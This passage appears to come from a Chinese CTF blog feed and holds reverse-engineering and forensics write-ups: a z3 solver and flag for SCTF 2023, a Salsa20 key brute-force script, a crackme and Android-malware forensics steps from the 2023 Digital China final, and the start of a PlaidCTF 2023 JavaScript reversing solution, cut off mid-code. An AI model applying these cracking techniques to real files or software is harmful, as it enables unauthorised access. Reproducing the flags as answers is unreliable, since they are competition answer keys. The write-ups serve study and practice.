class="number">8</span></span><br><span class="line">        self.X = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var22 = exp()</span><br><span class="line"></span><br><span class="line">var23 = exp()</span><br><span class="line"></span><br><span class="line">key = [Int((<span class="string">'key[%d]'</span> % i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>)]</span><br><span class="line">var22.key = key</span><br><span class="line"><span class="comment"># print(var22.key)</span></span><br><span class="line"><span class="keyword">for</span> ie <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    var22.key[ie] = (var22.key[ie] - var22.key[ie - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">var22.L[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">var22.R[<span class="number">0</span>] = <span class="number">8</span></span><br><span class="line">var22.X[<span class="number">0</span>] = <span class="number">11</span></span><br><span class="line">var22.L[<span class="number">1</span>] = <span class="number">15</span></span><br><span class="line">var22.R[<span class="number">1</span>] = <span class="number">23</span></span><br><span class="line">var22.X[<span class="number">1</span>] = -<span class="number">13</span></span><br><span class="line">var22.L[<span class="number">2</span>] = <span class="number">2</span></span><br><span class="line">var22.R[<span class="number">2</span>] = <span class="number">11</span></span><br><span class="line">var22.X[<span class="number">2</span>] = <span class="number">17</span></span><br><span class="line">var22.L[<span class="number">3</span>] = <span class="number">10</span></span><br><span class="line">var22.R[<span class="number">3</span>] = <span class="number">20</span></span><br><span class="line">var22.X[<span class="number">3</span>] = -<span class="number">19</span></span><br><span class="line">var22.L[<span class="number">4</span>] = <span class="number">6</span></span><br><span class="line">var22.R[<span class="number">4</span>] = <span class="number">13</span></span><br><span class="line">var22.X[<span class="number">4</span>] = <span class="number">23</span></span><br><span class="line">var22.L[<span class="number">5</span>] = <span class="number">9</span></span><br><span class="line">var22.R[<span class="number">5</span>] = <span class="number">21</span></span><br><span class="line">var22.X[<span class="number">5</span>] = -<span class="number">29</span></span><br><span class="line">var22.L[<span class="number">6</span>] = <span class="number">1</span></span><br><span class="line">var22.R[<span class="number">6</span>] = <span class="number">19</span></span><br><span class="line">var22.X[<span class="number">6</span>] = <span class="number">31</span></span><br><span class="line">var22.L[<span class="number">7</span>] = <span class="number">4</span></span><br><span class="line">var22.R[<span class="number">7</span>] = <span class="number">17</span></span><br><span class="line">var22.X[<span class="number">7</span>] = -<span class="number">37</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    var22.key[var22.L[i]] += var22.X[i]</span><br><span class="line">    var22.key[var22.R[i]] -= var22.X[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">24</span>):</span><br><span class="line">    var22.key[k] += var22.key[k - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">var23.key[<span class="number">0</span>] = <span class="number">252</span></span><br><span class="line">var23.key[<span class="number">1</span>] = <span class="number">352</span></span><br><span class="line">var23.key[<span class="number">2</span>] = <span class="number">484</span></span><br><span class="line">var23.key[<span class="number">3</span>] = <span class="number">470</span></span><br><span class="line">var23.key[<span class="number">4</span>] = <span class="number">496</span></span><br><span class="line">var23.key[<span class="number">5</span>] = <span class="number">487</span></span><br><span class="line">var23.key[<span class="number">6</span>] = <span class="number">539</span></span><br><span class="line">var23.key[<span class="number">7</span>] = <span class="number">585</span></span><br><span class="line">var23.key[<span class="number">8</span>] = <span class="number">447</span></span><br><span class="line">var23.key[<span class="number">9</span>] = <span class="number">474</span></span><br><span class="line">var23.key[<span class="number">10</span>] = <span class="number">577</span></span><br><span class="line">var23.key[<span class="number">11</span>] = <span class="number">454</span></span><br><span class="line">var23.key[<span class="number">12</span>] = <span class="number">466</span></span><br><span class="line">var23.key[<span class="number">13</span>] = <span class="number">345</span></span><br><span class="line">var23.key[<span class="number">14</span>] = <span class="number">344</span></span><br><span class="line">var23.key[<span class="number">15</span>] = <span class="number">486</span></span><br><span class="line">var23.key[<span class="number">16</span>] = <span class="number">501</span></span><br><span class="line">var23.key[<span class="number">17</span>] = <span class="number">423</span></span><br><span class="line">var23.key[<span class="number">18</span>] = <span class="number">490</span></span><br><span class="line">var23.key[<span class="number">19</span>] = <span class="number">375</span></span><br><span class="line">var23.key[<span class="number">20</span>] = <span class="number">257</span></span><br><span class="line">var23.key[<span class="number">21</span>] = <span class="number">203</span></span><br><span class="line">var23.key[<span class="number">22</span>] = <span class="number">265</span></span><br><span class="line">var23.key[<span class="number">23</span>] = <span class="number">125</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    var23.key[m] -= var23.key[m - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    var23.key[var22.L[n]] -= var22.key[n * <span class="number">3</span>]</span><br><span class="line">    var23.key[var22.R[n]] += var22.key[n * <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">24</span>):</span><br><span class="line">    var23.key[e] += var23.key[e - <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    s.add(var22.key[i] == var23.key[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (s.check() == sat)</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##结果</span></span><br><span class="line">key[<span class="number">21</span>] = <span class="number">55</span></span><br><span class="line">key[<span class="number">15</span>] = <span class="number">106</span></span><br><span class="line">key[<span class="number">6</span>] = <span class="number">53</span></span><br><span class="line">key[<span class="number">18</span>] = <span class="number">115</span></span><br><span class="line">key[<span class="number">23</span>] = <span class="number">125</span></span><br><span class="line">key[<span class="number">22</span>] = <span class="number">117</span></span><br><span class="line">key[<span class="number">20</span>] = <span class="number">99</span></span><br><span class="line">key[<span class="number">19</span>] = <span class="number">116</span></span><br><span class="line">key[<span class="number">17</span>] = <span class="number">48</span></span><br><span class="line">key[<span class="number">16</span>] = <span class="number">121</span></span><br><span class="line">key[<span class="number">14</span>] = <span class="number">112</span></span><br><span class="line">key[<span class="number">13</span>] = <span class="number">113</span></span><br><span class="line">key[<span class="number">11</span>] = <span class="number">109</span></span><br><span class="line">key[<span class="number">10</span>] = <span class="number">117</span></span><br><span class="line">key[<span class="number">8</span>] = <span class="number">98</span></span><br><span class="line">key[<span class="number">7</span>] = <span class="number">99</span></span><br><span class="line">key[<span class="number">5</span>] = <span class="number">114</span></span><br><span class="line">key[<span class="number">4</span>] = <span class="number">123</span></span><br><span class="line">key[<span class="number">9</span>] = <span class="number">115</span></span><br><span class="line">key[<span class="number">12</span>] = <span class="number">121</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="number">102</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="number">116</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="number">99</span></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">115</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下列报错？貌似因为class？</span></span><br><span class="line"><span class="comment"># res = []</span></span><br><span class="line"><span class="comment"># for i in range(24):</span></span><br><span class="line"><span class="comment">#     res.append(chr(m[key[i]].as_long()))</span></span><br><span class="line"><span class="comment"># s = ''.join(res)</span></span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>sctf{r5cbsumyqpjy0stc7u}</p><p><img src="/2023/07/11/2023SCTF-Syclang-%E4%B8%AD%E9%97%B4%E6%8C%87%E4%BB%A4IR%E5%88%86%E6%9E%90/image-20230711112814918.png" alt="image-20230711112814918"></p></body></html>]]></content>
      
      
      <categories>
          
          <category> 二进制学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023数字中国数据安全决赛WP复现</title>
      <link href="/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="数据安全-逆向区"><a href="#数据安全-逆向区" class="headerlink" title="数据安全 - 逆向区"></a>数据安全 - 逆向区</h1><h2 id="Encryptedfile"><a href="#Encryptedfile" class="headerlink" title="Encryptedfile"></a>Encryptedfile</h2><p>给了个加密程序以及一个加密的图片<code>flag.png.enc</code> </p><p>试一下就是这款软件对他进行加密、</p><p>那么只需要了解加密原理就能够逆出原程文件了</p><blockquote><p>因为打过另一个数字人才挑战赛， 感觉就是和那道题差不多</p><p>详情请看我另一篇数据中国的题目解析</p></blockquote><img src="/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/image-20230426191448375.png" alt="image-20230426191448375" style="zoom:67%;"><p>拖入ida64分析</p><p><code>FindCrypt 发现是 salsa20加密</code></p><p><img src="/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/image-20230426191649597.png" alt="image-20230426191649597"></p><p>salsa20加密原理如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入相关库和常量</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Salsa20</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line">KEY_SIZE = <span class="number">32</span>   <span class="comment"># 密钥长度</span></span><br><span class="line">IV_SIZE = <span class="number">8</span>     <span class="comment"># 初始化向量长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">salsa20_encrypt</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="comment"># 生成随机的初始化向量</span></span><br><span class="line">    iv = get_random_bytes(IV_SIZE)</span><br><span class="line">    <span class="comment"># 使用Salsa20算法进行加密</span></span><br><span class="line">    cipher = Salsa20.new(key=key, nonce=iv)</span><br><span class="line">    ciphertext = cipher.encrypt(data)</span><br><span class="line">    <span class="comment"># 将初始向量和密文返回</span></span><br><span class="line">    <span class="keyword">return</span> iv + ciphertext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">salsa20_decrypt</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="comment"># 取出初始化向量</span></span><br><span class="line">    iv = data[:IV_SIZE]</span><br><span class="line">    <span class="comment"># 取出密文部分</span></span><br><span class="line">    ciphertext = data[IV_SIZE:]</span><br><span class="line">    <span class="comment"># 使用Salsa20算法进行解密</span></span><br><span class="line">    cipher = Salsa20.new(key=key, nonce=iv)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="comment"># 返回解密后的明文</span></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br></pre></td></tr></tbody></table></figure><p>然后题目附件可以看出需要暴破密钥</p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Salsa20</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># Salsa20算法要求密钥长度必须为32字节、初始向量长度必须为8字节</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./flag.png.enc"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    buffer = f.read()</span><br><span class="line">s = <span class="string">'0123456789'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(s, repeat=<span class="number">4</span>):</span><br><span class="line">    key = <span class="string">''</span>.join(i)</span><br><span class="line">    key = key.ljust(<span class="number">32</span>, <span class="string">"\x00"</span>).encode()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        iv = <span class="built_in">bytes</span>([j] * <span class="number">8</span>)</span><br><span class="line">        ciphey = Salsa20.new(key=key, nonce=iv)</span><br><span class="line">        plain = ciphey.decrypt(buffer)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b'PNG'</span> <span class="keyword">in</span> plain[:<span class="number">4</span>]:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./flags.png"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(plain)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/image-20230426191839144.png" alt="image-20230426191839144"></p><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>使⽤ IDA Pro 分析程序，观察到机器码为 666666666666，并将其修改为题⽬需要更改的编码 码’1653643685031597’。 </p><p>接着，使⽤<code>FindCrypt</code>⼯具发现许多变量都与 MD5 算法相关，于是调试程序以查看具体的函数实现。 </p><p>发现这两个函数是 MD5 的 digest 实现函数，进⼀步分析发现后⾯的函数实际上是实现 MD5 hash 的。 </p><p>经过多次调试和分析，发现在加密后的函数中，key 值为 1228240365737281。 </p><p>flag{1228240365737281}</p><p><img src="/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/image-20230426191941623.png" alt="image-20230426191941623"></p><h1 id="数据分析-取证区"><a href="#数据分析-取证区" class="headerlink" title="数据分析 - 取证区"></a>数据分析 - 取证区</h1><h2 id="Bad-Hole-1"><a href="#Bad-Hole-1" class="headerlink" title="Bad Hole. 1"></a>Bad Hole. 1</h2><p>题目分析得知</p><p>有个包名(也就是恶意软件)入侵了手机</p><p>但被删除了</p><p>所以  用 <code>DiskGenius</code>打开</p><p>恢复文件</p><p>经过查找  找到了被删除的软件，（其实也可以看出就这个包被删除的一干二净了）</p><p><img src="/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/image-20230426193249682.png" alt="image-20230426193249682"></p><p><code>com.csgroup.terminal</code> 然后MD5</p><h2 id="Bad-Hole-2"><a href="#Bad-Hole-2" class="headerlink" title="Bad Hole.2"></a>Bad Hole.2</h2><p>题目要求寻找 执行恶意软件操作的第一条指令</p><p>上一问发现了恶意软件的名字</p><p><img src="/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/image-20230426193631952.png" alt="image-20230426193631952"></p><p>打开kali</p><p><code>strings data.vmdk | grep  "sfzs.apk" </code></p><p>得到答案</p><p><img src="/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/image-20230426193901950.png" alt="image-20230426193901950"></p><h2 id="Bad-Hole-4"><a href="#Bad-Hole-4" class="headerlink" title="Bad Hole.4"></a>Bad Hole.4</h2><p>文件恢复   最下面那张</p><p><img src="/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/image-20230426193437507.png" alt="image-20230426193437507"></p><p><img src="/2023/04/26/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9BWP%E5%A4%8D%E7%8E%B0/image-20230426193415738.png" alt="image-20230426193415738"></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PlaidCTF2023WriteUp复现-js逆向</title>
      <link href="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/"/>
      <url>/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Treasure-Map"><a href="#Treasure-Map" class="headerlink" title="Treasure Map"></a>Treasure Map</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>也不是第一次接触js逆向了</p><p>但这一道  明显 比之前接触的都好</p><p>确实学到辣很多东西</p><p>不得不说  国际赛确实比国内的比赛有东西(每次玩  都能学到很多新东西)</p><p>当然，   每次也都被虐爆  不过 很开心  <strong>痛并快乐着</strong></p><p>不扯了  看题 </p><p>先贴一篇博文 – 笔者也是引用的这个</p><p><a href="https://rinnnt.github.io/ctf/2023/04/16/plaidctf-2023-writeup.html">https://rinnnt.github.io/ctf/2023/04/16/plaidctf-2023-writeup.html</a></p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p><img src="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/image-20230417164935413.png" alt="image-20230417164935413"></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> b64 = <span class="string">`</span></span><br><span class="line"><span class="string">A</span></span><br><span class="line"><span class="string">B</span></span><br><span class="line"><span class="string">C</span></span><br><span class="line"><span class="string">D</span></span><br><span class="line"><span class="string">E</span></span><br><span class="line"><span class="string">F</span></span><br><span class="line"><span class="string">G</span></span><br><span class="line"><span class="string">H</span></span><br><span class="line"><span class="string">I</span></span><br><span class="line"><span class="string">J</span></span><br><span class="line"><span class="string">K</span></span><br><span class="line"><span class="string">L</span></span><br><span class="line"><span class="string">M</span></span><br><span class="line"><span class="string">N</span></span><br><span class="line"><span class="string">O</span></span><br><span class="line"><span class="string">P</span></span><br><span class="line"><span class="string">Q</span></span><br><span class="line"><span class="string">R</span></span><br><span class="line"><span class="string">S</span></span><br><span class="line"><span class="string">T</span></span><br><span class="line"><span class="string">U</span></span><br><span class="line"><span class="string">V</span></span><br><span class="line"><span class="string">W</span></span><br><span class="line"><span class="string">X</span></span><br><span class="line"><span class="string">Y</span></span><br><span class="line"><span class="string">Z</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string">f</span></span><br><span class="line"><span class="string">g</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string">j</span></span><br><span class="line"><span class="string">k</span></span><br><span class="line"><span class="string">l</span></span><br><span class="line"><span class="string">m</span></span><br><span class="line"><span class="string">n</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">p</span></span><br><span class="line"><span class="string">q</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string">u</span></span><br><span class="line"><span class="string">v</span></span><br><span class="line"><span class="string">w</span></span><br><span class="line"><span class="string">x</span></span><br><span class="line"><span class="string">y</span></span><br><span class="line"><span class="string">z</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">4</span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">6</span></span><br><span class="line"><span class="string">7</span></span><br><span class="line"><span class="string">8</span></span><br><span class="line"><span class="string">9</span></span><br><span class="line"><span class="string">+</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">=`</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">go</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">    <span class="keyword">const</span> bti = b64.<span class="title function_">trim</span>().<span class="title function_">split</span>(<span class="string">"\n"</span>).<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, x, i</span>) =&gt;</span> (acc.<span class="title function_">set</span>(x, i), acc), <span class="keyword">new</span> <span class="title class_">Map</span>());</span><br><span class="line">    <span class="keyword">const</span> upc = <span class="variable language_">window</span>.<span class="property">buffer</span>.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="keyword">const</span> moi = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> x.<span class="title function_">text</span>()) </span><br><span class="line">    # 改这行的<span class="keyword">import</span>就行</span><br><span class="line">    <span class="keyword">const</span> tg = <span class="keyword">await</span> <span class="title function_">fetch</span>(moi.<span class="title function_">slice</span>(moi.<span class="title function_">lastIndexOf</span>(<span class="string">"="</span>) + <span class="number">1</span>)).<span class="title function_">then</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> x.<span class="title function_">json</span>())</span><br><span class="line">    <span class="keyword">const</span> fl = tg.<span class="property">mappings</span>.<span class="title function_">split</span>(<span class="string">";"</span>).<span class="title function_">flatMap</span>(<span class="function">(<span class="params">v, l</span>) =&gt;</span>v.<span class="title function_">split</span>(<span class="string">","</span>).<span class="title function_">filter</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> !!x).<span class="title function_">map</span>(<span class="function">(<span class="params">input</span>) =&gt;</span> input.<span class="title function_">split</span>(<span class="string">""</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> bti.<span class="title function_">get</span>(x)).<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, i</span>) =&gt;</span> (i &amp; <span class="number">32</span> ? [...acc.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>), [...acc.<span class="title function_">slice</span>(-<span class="number">1</span>)[<span class="number">0</span>], (i &amp; <span class="number">31</span>)]] : [...acc.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>), [[...acc.<span class="title function_">slice</span>(-<span class="number">1</span>)[<span class="number">0</span>], i].<span class="title function_">reverse</span>().<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, i</span>) =&gt;</span> (acc &lt;&lt; <span class="number">5</span>) + i, <span class="number">0</span>)]].<span class="title function_">map</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> <span class="keyword">typeof</span> x === <span class="string">"number"</span> ? x : x[<span class="number">0</span>] &amp; <span class="number">0x1</span> ? (x[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">1</span>) === <span class="number">0</span> ? -<span class="number">0x80000000</span> : -(x[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">1</span>) : (x[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">1</span>)).<span class="title function_">concat</span>([[]])), [[]]).<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>)).<span class="title function_">map</span>(<span class="function">(<span class="params">[c, s, ol, oc, n]</span>) =&gt;</span> [l,c,s??<span class="number">0</span>,ol??<span class="number">0</span>,oc??<span class="number">0</span>,n??<span class="number">0</span>]).<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, e, i</span>) =&gt;</span> [...acc, [l, e[<span class="number">1</span>] + (acc[i - <span class="number">1</span>]?.[<span class="number">1</span>]??<span class="number">0</span>), ...e.<span class="title function_">slice</span>(<span class="number">2</span>)]], [])).<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, e, i</span>) =&gt;</span> [...acc, [...e.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">2</span>), ...e.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">x, c</span>) =&gt;</span> x + (acc[i - <span class="number">1</span>]?.[c + <span class="number">2</span>] ?? <span class="number">0</span>))]], []).<span class="title function_">map</span>(<span class="function">(<span class="params">[l, c, s, ol, oc, n], i, ls</span>) =&gt;</span> [tg.<span class="property">sources</span>[s],moi.<span class="title function_">split</span>(<span class="string">"\n"</span>).<span class="title function_">slice</span>(l, ls[i+<span class="number">1</span>] ? ls[i+<span class="number">1</span>]?.[<span class="number">0</span>] + <span class="number">1</span> : <span class="literal">undefined</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">x, ix, nl</span>) =&gt;</span> ix === <span class="number">0</span> ? l === ls[i+<span class="number">1</span>]?.[<span class="number">0</span>] ? x.<span class="title function_">slice</span>(c, ls[i+<span class="number">1</span>]?.[<span class="number">1</span>]) : x.<span class="title function_">slice</span>(c) : ix === nl.<span class="property">length</span> - <span class="number">1</span> ? x.<span class="title function_">slice</span>(<span class="number">0</span>, ls[i+<span class="number">1</span>]?.[<span class="number">1</span>]) : x).<span class="title function_">join</span>(<span class="string">"\n"</span>).<span class="title function_">trim</span>()]).<span class="title function_">filter</span>(<span class="function">(<span class="params">[_, x]</span>) =&gt;</span> x === upc).<span class="title function_">map</span>(<span class="function">(<span class="params">[x]</span>) =&gt;</span> 